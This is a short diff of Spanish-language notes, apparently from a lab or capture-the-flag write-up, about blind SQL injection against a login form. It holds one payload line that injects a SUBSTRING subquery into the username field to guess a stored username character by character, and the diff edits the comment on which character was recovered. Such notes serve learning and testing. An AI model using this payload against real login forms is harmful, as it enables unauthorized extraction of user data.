@@ -87,5 +87,5 @@ tenemos que hacer esto hasta sacar el nombre de la tabla
 	username=kitty'+AND+SUBSTRING((SELECT+username+from+siteusers+LIMIT+0,1),1,1)="a"+#&password=kitty
 ```
 
-sacamos el primer carácter "g"
+sacamos carácter de la posición 4 "g"  
 ![[Pasted image 20240205001529.png]]
